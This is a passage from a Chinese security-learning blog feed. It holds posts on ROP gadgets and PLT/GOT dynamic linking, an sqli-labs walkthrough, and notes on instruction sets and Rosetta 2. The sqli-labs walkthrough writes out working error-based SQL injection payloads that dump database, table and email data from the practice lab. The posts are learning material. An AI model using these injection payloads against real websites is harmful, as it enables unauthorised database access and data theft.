<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241127094818640.png" alt="image-20241127094818640" style="zoom:67%;">

<p>左边是程序执行的过程。原来的基础栈溢出只需要返回到后门函数或是某一个特定位置就可以了。</p>
<p>如今这个返回地址是一个<strong>链状</strong>的结构如今要执行四个不同片段（<strong>gadget</strong>）的代码，所以要跳转四次。</p>
<p>这个<strong>gadget</strong>就是这种，先pop（或mov，lea）一个数据给到寄存器，再ret的函数</p>
<p>不过pop比较好用。原因esp可以自动向上移，指向下一个IP地址。</p>
<p>（这个还真像链表，数据成员作为函数参数，指针成员指向下一个执行的地址）</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241127190339914.png" alt="image-20241127190339914" style="zoom:50%;"> 

<p>payload就像是一个个gadget搭起来的拼图</p>
<h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>使用这个工具可以找到需要的指令以及它的地址</p>
<p>即找到我们的gadget</p>
<p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241127185035223.png" alt="image-20241127185035223"> </p>
<p>非常de好用</p>
<h5 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h5><p>gadget是mov，ret或是pop ，ret都可以。只要最后有个ret就可以无限执行下去。</p>
<p>因为ret可以<strong>改变程序的执行流</strong>（IP ）。我们只需要将一系列返回地址或者数据溢出到栈中，就可以不断跳跃在各个gadget中。</p>
<ol>
<li>栈溢出，让返回地址第一个gadget</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128141239882.png" alt="image-20241128141239882"></p>
<ol start="2">
<li>执行第一个gadget。将esp指向的元素赋值给edx，esp自增指向新的返回地址</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128141455136.png" alt="image-20241128141455136"></p>
<ol start="3">
<li>执行第二个gadget。将eax清空，返回esp所指向的地址</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128141630872.png" alt="image-20241128141630872"></p>
<p>最终执行过程就像这样</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128143137143.png" alt="image-20241128143137143" style="zoom:67%;"> 

<p>在栈中溢出一系列的返回地址，链式执行一系列的gadget。最后执行int 0x80指令，成功执行系统调用。这样就达到了攻击的目的。</p>
<p>图中最后从Text段到Kernel中执行的系统调用。</p>
<h4 id="动态链接-vs-静态链接"><a href="#动态链接-vs-静态链接" class="headerlink" title="动态链接 vs 静态链接"></a>动态链接 vs 静态链接</h4><p>动态链接：将用到的库函数标记一下。动态链接是在装载（从可执行文件到进程映像）的时候才可见。程序装载进入内存时加载库代码解析外部引用</p>
<p>静态链接：本身将库函数全部写入elf文件本身。静态链接在链接（从目标文件到可执行文件）时可见。链接器在编译链接时将库代码加入可执行文件中</p>
<p>所以两种文件大小差距很大。差的就是库的内容 </p>
<p>可以在ida中看看两种不同方式中的函数数量</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317212557028.png" alt="image-20250317212557028"></p>
<p>像这种粉色背景的函数，都是在程序中没有具体实现，只是一个符号而已。这个符号是用来解析函数在动态链接库中的位置。往往一个动态链接还要调用更底层的一些动态链接。</p>
<p>所以ret2syscall这题要用静态链接，用来提供足够的gadget</p>
<h3 id="动态链接的相关结构"><a href="#动态链接的相关结构" class="headerlink" title="动态链接的相关结构"></a>动态链接的相关结构</h3><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317213827354.png" alt="image-20250317213827354" style="zoom:50%;">

<ul>
<li><p>dynamic section：提供动态链接相关信息。包括整个动态链接的所有内容，包括其他的表，位置，如何组织</p>
</li>
<li><p>link_map：保存进程载入的动态链接库的链表。除了基本的动态链接库，可能载入了其他的动态链接库。这些所有的动态链接库所形成的可执行文件就会在lnik_map中形成一个链表</p>
</li>
<li><p>dl_runtime_resolve：是一个函数，解析第一次在动态链接的程序中执行的函数的真实地址。由plt调用，向got写入真正地址的内容</p>
</li>
<li><p>.got section：全局偏移量表，保存了全局的变量</p>
</li>
<li><p>.got.plt section：保存了函数的地址</p>
</li>
</ul>
<h3 id="动态链接过程"><a href="#动态链接过程" class="headerlink" title="动态链接过程"></a>动态链接过程</h3><p>例子：调用libc中的foo函数</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317220404709.png" alt="image-20250317220404709" style="zoom:67%;">

<p>text是代码节</p>
<p>foo是我们写的自定义函数</p>
<p>plt是程序中代码段解析函数真实地址的一个节</p>
<p>（假设libc中有一个foo函数）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	foo();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在汇编中调用一个用户函数会进行一个call指令。所以就会有一个call foo</p>
<p>因为foo是一个动态链接库中的代码。所以call foo不能够直接跳转到它自己的代码段里的库里。实际上在libc.so里的一段。但也不能直接跳到libc里，因为不知道具体位置</p>
<p>code段里还有一个plt节（所以plt本质上也是一些代码）。每一个动态链接库中调用的函数，都会在plt节中创建一个表项。</p>
<p>第一次调用foo时如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317221821855.png" alt="image-20250317221821855"></p>
<p>plt中存储foo函数的表项位置，通过此再从got表取得foo的真实地址。但是由于是第一次调用foo函数，got表并没有经过特殊函数解析，所以并没有填写真实地址。此时填写表项位置，从got表跳回了plt位置。这个时候plt表就知道了got表没有真实地址，并开始寻找foo函数的真实地址，填入got表中。</p>
<p>再回到最上面的那张图。</p>
<p>jmp到got表发现没东西，于是回到plt表。执行下方指令</p>
<p>首先push index。这个index就是在plt表中调用函数对应的索引。如上图为例，foo函数的index就是3。这里的意思就是说我要解析的是plt表中的第3个函数。</p>
<p>接着push *(GOT + 4)。表示要去哪个动态链接库去找需要的内容。接着jmp (GOT + 8 )进入dl_resolve函数。如下图</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223129869.png" alt="image-20250317223129869" style="zoom:50%;">

<p>此时dl_runtime_resolve函数解析foo的真正地址填入.got.plt中</p>
<p>解析过程就不说了</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223325220.png" alt="image-20250317223325220" style="zoom:50%;">

<p>解析完毕后，就将foo函数真实地址的值填入got表中</p>
<p>如果变为第二次调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223500836.png" alt="image-20250317223500836"></p>
<p>整个过程如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223706098.png" alt="image-20250317223706098"></p>
<p>现新写一个程序，并使用动态链接</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&#x27;first!&#x27;</span>);</span><br><span class="line">	x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;second!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;once&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们在ida中看看plt表</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318084206153.png" alt="image-20250318084206153" style="zoom:50%;">

<p>索引0这块就是put的表项、索引1这块就是printf的表项、索引2这块就是exit的表项</p>
<p>每个表项的长度都是16字节</p>
<p>在pwndbg中输入plt即可查看plt表，或者使用二进制查看plt内容 如 x&#x2F;20 &lt;plt的地址&gt;</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318084411838.png" alt="image-20250318084411838"></p>
<p>plt存在text节或init节这些代码中，作为数据存在的got节和got.plt节，在data段中</p>
<p>在ida中看看got表</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085135125.png" alt="image-20250318085135125"></p>
<p>这个got表实际上是一个数组，元素长度位8字节（64位程序地址长度）。每一个表项就是地址而已。</p>
<p>直接输入plt可以看到三个表项</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085412814.png" alt="image-20250318085412814" style="zoom:50%;">

<p>一个表项是十六个字节</p>
<p>再输入got</p>
<p>这里是程序刚刚开始运行的时候</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085506819.png" alt="image-20250318085506819"></p>
<p>告诉我们got表中存了三个函数，每个函数8字节。每个地址都是0x000000000040……，并且告诉了我们再plt表中对应的索引</p>
<p>这个地址对应代码段（看颜色也能看出来），还是plt中的位置，也就是说这个时候got并没有存储这些函数的真实地址</p>
<p>接着步过调用puts函数后</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085926812.png" alt="image-20250318085926812"></p>
<p>这个时候可以看到，got表中已经填入了puts函数的真实地址</p>
<p>我们得到这个真实地址，并使用disass指令反汇编，就可以得到puts函数真正的代码</p>
<p>如果我们disass没有调用的函数，得到的就是plt中的代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318090244979.png" alt="image-20250318090244979"></p>
<h3 id="pwnttool中elf模块"><a href="#pwnttool中elf模块" class="headerlink" title="pwnttool中elf模块"></a>pwnttool中elf模块</h3><p>elf &#x3D; ELF(“.&#x2F;文件名”)</p>
<p>hex(elf.got[“puts”])：得到puts函数在got表中的表项的地址</p>
<p>6y</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>指令系统</title>
    <url>/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-zhiling1.png" alt="zhiling1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling2.png" alt="zhiling2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling3.png" alt="zhiling3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling4.png" alt="zhiling4"></p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>计算机组成与系统结构</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-lab（一）</title>
    <url>/2024/11/09/sql-lab/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h1><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/sql1.png" alt="sql1"></p>
<p>图内补充：<br>table_schema ： 表归属于的数据库</p>
<p>information_schema：这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p>
<p>查询当前用户：<code>select user（）</code></p>
<p>数据库版本： <code>select version （）</code></p>
<p>数据库名： <code>select database（）</code></p>
<p>查看数据库&#x2F;表：<code>show databases/tables；</code></p>
<p>切换数据库： <code>use 数据库名</code></p>
<p>基础查询：<code>select 字段1， 字段2, … from 表名；</code>   <code>select * from 表名；</code></p>
<p>条件查询：<code>select 字段 from 表名 where 条件</code></p>
<p><strong>联合查询：<code>select * from 表名 union select 1，2，3</code></strong>  </p>
<p>排序： <code>select * from 表名 order by 字段</code></p>
<hr>
<h1 id="SQL注入常见类型"><a href="#SQL注入常见类型" class="headerlink" title="SQL注入常见类型"></a>SQL注入常见类型</h1><h2 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>当输入的参数x为整形时，即select  *  from  &lt;表名 &gt;  where id &#x3D; x</p>
<p>判断： 1 and 1 &#x3D; 1           1 and 1 &#x3D; 2        比较两者的返回页面</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>当输入的参数x为字符型时，即select * from &lt;表名&gt; where id &#x3D; ‘x’</p>
<p>判断： 1‘ and ‘1’ &#x3D; ‘1          1’ and ‘1’ &#x3D; ‘2 </p>
<h2 id="按获取方式分类"><a href="#按获取方式分类" class="headerlink" title="按获取方式分类"></a><strong>按获取方式分类</strong></h2><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><p>利用页面回显的数据库报错信息</p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在注入点的判断过程中，SQL语句执行后的报错信息会经过后端显示在页面中华</p>
<h4 id="常见可利用函数"><a href="#常见可利用函数" class="headerlink" title="常见可利用函数"></a>常见可利用函数</h4><p>floor()	<strong>extractvalue()	updatexml()</strong>	geometrycollection()	polygon()	multipolygon()</p>
<p><strong>concat()</strong></p>
<h5 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h5><p><code>concat(str1, str2,…)</code></p>
<p>将多个字符串连接成一个字符串</p>
<h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h5><p><code>group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</code></p>
<p>使用distinct可以排除重复值</p>
<p>如果需要对结果中的值进行排序，可以使用order by子句</p>
<p>separator是一个字符串值，默认为逗号</p>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>extractvalue(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;)</code></p>
<p>从目标xml文件中返回包含查询值的字符串</p>
<p><strong>extractvalue函数一次只能查询32位长度</strong></p>
<p>解决方案：</p>
<ol>
<li>加上<code>limit x,1</code> 逐一查询</li>
<li>用group_concat函数把查询结果分组聚合，然后用<code>and xxxx not in ’xxx‘，’xxx‘</code>过滤掉前面回显的</li>
<li>用<code>substring()</code>截取</li>
</ol>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p><code>updatexml(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;,&#39;替换后的值&#39;)</code></p>
<p>修改xml文件中符合字符串的值</p>
<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>利用页面返回的不一致</p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>利用页面响应时间</p>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>使用union关键字</p>
<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>执行多条SQL语句</p>
<hr>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p>&#x2F;**&#x2F; </p>
<h3 id="and-or被过滤"><a href="#and-or被过滤" class="headerlink" title="and&#x2F;or被过滤"></a>and&#x2F;or被过滤</h3><p>&amp;&amp; ||</p>
<hr>
<h1 id="SQLi-labs"><a href="#SQLi-labs" class="headerlink" title="SQLi-labs"></a>SQLi-labs</h1><h3 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h3><h4 id="基于报错的注入-1"><a href="#基于报错的注入-1" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h4><ol>
<li>验证是字符型还是数字型注入</li>
</ol>
<p>​	<code>?id = 1 and 1 = 1</code>         和    <code>?id = 1 and 1 = 2</code></p>
<p>​	<code>?id = 1&#39; and &#39;1&#39; = &#39;1</code> 和   <code>?id = 1&#39; and &#39;1&#39;=&#39;2</code></p>
<p>​       判断两次回显结果是否相同。</p>
<ol>
<li><p>查询当前数据库</p>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select database()),0x7e))) --+</code>、</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110003235758.png" alt="image-20241110003235758"></p>
<p>爆出数据库名为security</p>
<p>当然用union也可以</p>
</li>
<li><p>查询表名</p>
</li>
</ol>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110004543422.png" alt="image-20241110004543422"></p>
<ol start="4">
<li>查询字段名</li>
</ol>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110005049115.png" alt="image-20241110005049115"></p>
<ol start="5">
<li>查询字段值</li>
</ol>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(id,&#39;,&#39;,email_id) from security.emails),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110005953540.png" alt="image-20241110005953540"></p>
<p>发现没有显示完</p>
<p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select substring(group_concat(id,&#39;,&#39;,email_id),80,40) from security.emails),0x7e))) --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241110010136450.png" alt="image-20241110010136450"></p>
<p>试着这样查询一下账号和密码吧</p>
<h4 id="联合注入法"><a href="#联合注入法" class="headerlink" title="联合注入法"></a>联合注入法</h4><p>1.爆字段数量</p>
<p>order by</p>
<p>2.爆数据库名</p>
<p>union select </p>
<p>注意修改id修改为负数。</p>
<p>先试试看哪些位置可以回显出来。</p>
<p>3.爆表名</p>
<p>4.爆字段名</p>
<p>5.爆字段值</p>
<h3 id="lesson-2"><a href="#lesson-2" class="headerlink" title="lesson 2"></a>lesson 2</h3><p>过程和lesson 1一样。只不过是数字型注入。</p>
<h3 id="lesson-3"><a href="#lesson-3" class="headerlink" title="lesson 3"></a>lesson 3</h3><p>过程和lesson 1一样，不过闭合方式为 ‘）</p>
<h3 id="lesson-4"><a href="#lesson-4" class="headerlink" title="lesson 4"></a>lesson 4</h3><p>过程和lesson 1一样，不过闭合方式为 ”）</p>
<h3 id="lesson-5"><a href="#lesson-5" class="headerlink" title="lesson 5"></a>lesson 5</h3><p>也可以这样做</p>
<h3 id="lesson-6"><a href="#lesson-6" class="headerlink" title="lesson 6"></a>lesson 6</h3><p>也可以这样做</p>
<p>怎么都有报错回显。布尔盲注和时间盲注有点暴力有点纯。使用sqlmap会好得多但是我暂时不会用</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果的罗塞塔石碑 —— Rosetta 2</title>
    <url>/2024/11/09/Rosetta/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="ARM架构与x86架构"><a href="#ARM架构与x86架构" class="headerlink" title="ARM架构与x86架构"></a>ARM架构与x86架构</h2><p><strong>指令集架构（ISA</strong>）是计算机硬件与软件之间的接口规范，定义了处理器可以执行的基本指令（如算术运算、数据传输、控制转移等）、指令格式、寻址模式以及相关的寄存器和数据类型。简单来说，它就像是处理器的“语言”（<strong>CPU预定义的操作和计算</strong>），让程序员能够编写可以在特定架构上运行的软件，同时也帮助设计处理器的工程师理解如何实现这些指令（简化程序员的工作）。</p>
<p>那如果要简化程序员的工作，这意味着微处理器的工作十分复杂。<del>甲方只需要提要求就好了，而乙方需要考虑的就多了。</del>那到底是应该简化程序员的工作，还是简化微处理器的工作？</p>
<p>由此产生了两种想法：<strong>CISC</strong> 和 <strong>RISC</strong></p>
<p><strong>x86</strong>：<strong>基于CISC的处理器架构</strong>，拥有非常丰富的指令集。一条指令可以完成整个计算（如乘法）或将一块数据直接从内存中的一个位置移动到另一个位置，并且这一系列复杂的操作可以在一个周期内完成。但这也意味着它需要更多的晶体管，从而会占用控件并消耗能量。</p>
<p><strong>ARM</strong>：<strong>基于RISC的处理器架构</strong>，每条指令仅代表一个能耗较低的简单操作。这使得汇编语言程序员的工作变得更加复杂，但却简化了处理器的工作。利用RISC处理器和先进的RISC计算机，可以通过运行多条指令或通过将复杂工作推给编译器（而不是CPU内核）来执行复杂工作。</p>
<p>两种CPU设计都具有高性能，但ARM设计往往侧重于更小巧的外形、电池使用时间、尺寸、免除散热要求和成本。</p>
<p>具体可见 <a href="https://pocon041.github.io/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/">指令系统 | Pocon’s Blog</a></p>
<hr>
<h2 id="Mac向Apple芯片迁移"><a href="#Mac向Apple芯片迁移" class="headerlink" title="Mac向Apple芯片迁移"></a>Mac向Apple芯片迁移</h2><p>在2020年6月22日的苹果全球开发者大会上，苹果公司CEO蒂姆·库克宣布将Mac电脑从英特尔的x86-64的处理器平台迁移至ARM64架构的Apple芯片（由苹果自行设计的处理器）。（在此之前也有过迁移经历）</p>
<p>既然是两种不同的指令集架构，苹果是如何实现让Intel平台上开发的软件在ARM架构平台的Mac上顺利运行的呢？</p>
<hr>
<h2 id="Rosetta-2"><a href="#Rosetta-2" class="headerlink" title="Rosetta 2"></a>Rosetta 2</h2><p>在此之前，先让我讲讲另一种实现机制：<strong>通用二进制</strong></p>
<p>通用二进制是一种将多个架构的代码打包在同一个可执行文件中的技术。（由于这些多平台可执行程序文件容量比原来要大，所以也称为<strong>胖二进制</strong>。）该文件包含针对不同架构的机器代码，操作系统在运行时根据硬件架构选择合适的代码段执行。</p>
<p>换而言之，也就是提供多个翻译版本，选你看得懂的那个。</p>
<blockquote>
<p>[!WARNING]</p>
<p>以下为个人见解</p>
</blockquote>
<p>制作和优化其应用的ARM版本需要时间。创建通用二进制文件需要对源代码进行修改和测试，因此开发的复杂性会大幅提升。为了提供更灵活使用的解决方案，在当时<strong>Rosetta</strong>成为主流，而通用二进制版本需要更长的时间来推广和普及。</p>
<p>换而言之，两个国家的人（Intel和Silicon）说的是不同的语言，彼此听不懂对方的话，还好的是都是用嘴说，声音通过空气传播，别人也都是用耳朵听的。那么，中间有个翻译（Rosetta），可以把一种语言翻译成另外一种。</p>
<p><strong>Rosetta</strong>：一种动态翻译工具。允许已经存在的Intel x86应用在Apple Silicon（ARM架构）上运行，而无需开发者重新编译或发布新的版本。这使得用户能够立即继续使用他们的旧软件，无缝过渡到新硬件上。</p>
<p>苹果公司声称：那些重视用户互动而较少计算量的应用程序（比如word等文字处理器）是比较适合同归哦Rosetta编译的；而需要大计算量的程序，比如Photoshop需要另外的通用二进制版本。</p>
<p><strong>Rosetta 2</strong>：Rosetta 2预装在使用Apple Silicon芯片的Mac电脑的操作系统上。它可以将AMD64指令进行翻译。与Rosetta不同的是，Rosetta 2在安装软件时会把Intel版本程序转化为ARM程序，加上Apple的处理器性能很高，因此即使需要大计算量的程序，通过  Rosetta 2编译也能流畅地执行。（Intel版本Mac操作系统上地应用程序）</p>
<p>让我们（浅显的）深入探讨一下底层原因：</p>
<ol>
<li>尽管指令集不同，ARM和Intel底层架构有较高相似度（具体我不知道为啥）。x86指令集虽然复杂，但Rosetta 2只需要支持其中的子集，也就是用户态指令。并且两套指令都是小端存储。</li>
<li>最大障碍是内存排序（内存一致性模型不一样），即两个CPU在内存中看到彼此修改的顺序不一样。所以苹果将Intel的内存排序添加到他们的CPU中<del>（这也太暴力了）</del>。在运行转换后的x86代码时，它们会通过一个后门开关切换CPU的模式以符合Intel的内存排序。</li>
</ol>
<p>参考链接：</p>
<p><a href="https://www.redhat.com/zh/topics/linux/ARM-vs-x86">https://www.redhat.com/zh/topics/linux/ARM-vs-x86</a></p>
<p><a href="https://zh.wikipedia.org/wiki/Mac%E5%90%91Apple%E8%8A%AF%E7%89%87%E8%BF%81%E7%A7%BB">Mac向Apple芯片迁移 - 维基百科，自由的百科全书</a></p>
<p><a href="https://zh.wikipedia.org/wiki/Rosetta">Rosetta - 维基百科，自由的百科全书</a></p>
<p><a href="https://www.v2ex.com/t/726640">哪位老哥能解释一下 Rosetta 的实现原理？ - V2EX</a></p>
<p><a href="https://www.bilibili.com/opus/850506105874284549">【转】苹果的 Rosetta 2 的实现原理大概是怎样的？ - 哔哩哔哩</a></p>
<p><a href="https://juejin.cn/post/6978804300768083976#heading-0">https://juejin.cn/post/6978804300768083976#heading-0</a></p>
<p><a href="https://x.com/ErrataRob/status/1331750197836345345">(20) Robert Graham 𝕏 on X: “19&#x2F; …even when translating x86 code, all that reference counting overhead (already more efficient than garbage collection) gets dropped in half. Yet another weird performance enhance to add to all the others.” &#x2F; X</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E6%8E%92%E5%BA%8F">内存排序 - 维基百科，自由的百科全书</a></p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>计算机组成与系统结构</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统结构</title>
    <url>/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="计算机系统结构"><a href="#计算机系统结构" class="headerlink" title="计算机系统结构"></a>计算机系统结构</h1><h2 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h2><h2 id="微体系架构"><a href="#微体系架构" class="headerlink" title="微体系架构"></a>微体系架构</h2><h2 id="数据表达"><a href="#数据表达" class="headerlink" title="数据表达"></a>数据表达</h2><h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><h2 id="寄存器定义"><a href="#寄存器定义" class="headerlink" title="寄存器定义"></a>寄存器定义</h2><h2 id="指令系统"><a href="#指令系统" class="headerlink" title="指令系统"></a>指令系统</h2><p>​	<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241106160537615.png" alt="image-20241106160537615"></p>
<p>​	<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241106160557265.png" alt="image-20241106160557265"></p>
<p>​	<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241106160618550.png" alt="image-20241106160618550"></p>
<h2 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h2><h2 id="机器工作状态"><a href="#机器工作状态" class="headerlink" title="机器工作状态"></a>机器工作状态</h2><h2 id="输入输出结构"><a href="#输入输出结构" class="headerlink" title="输入输出结构"></a>输入输出结构</h2>]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>计算机组成与系统结构</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF中SQL注入writeup</title>
    <url>/2024/11/11/SQLi/SQL%E6%B3%A8%E5%85%A5writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h2><ol>
<li><h5 id="判断闭合方式为-’（单引号）"><a href="#判断闭合方式为-’（单引号）" class="headerlink" title="判断闭合方式为 ’（单引号）"></a>判断闭合方式为 <code>’</code>（单引号）</h5></li>
